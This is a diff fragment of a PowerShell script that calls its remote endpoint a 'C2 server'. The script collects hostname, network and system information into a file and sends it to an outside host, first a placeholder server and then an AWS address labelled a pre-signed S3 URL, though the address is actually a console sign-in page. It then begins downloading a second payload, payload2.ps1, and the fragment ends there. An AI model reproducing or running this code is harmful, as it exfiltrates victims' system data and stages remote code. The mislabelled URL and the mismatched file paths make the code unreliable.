@@ -11,9 +11,12 @@ $systeminfo = systeminfo
 $info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
 $info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"
 
-# Task 2: Send the system information file back to the C2 server
-$server = "http://yourserver.com/upload_endpoint"  # Replace with your server URL
-Invoke-WebRequest -Uri $server -Method Post -InFile "C:\Users\Public\sysinfo.txt" -ContentType "multipart/form-data"
+# Task 2: Upload the system information file to S3 using a pre-signed URL
+$presignedUrl = "https://529088270990.signin.aws.amazon.com/console"  # Replace with the actual pre-signed URL
+$fileToUpload = "$programFilesFolder\sysinfo.txt"
+
+Invoke-WebRequest -Uri $presignedUrl -Method Put -InFile $fileToUpload -ContentType "text/plain"
+
 
 # Task 3: Download and execute an additional payload (e.g., payload2.ps1)
 $payloadUri = "http://yourserver.com/payload2.ps1"
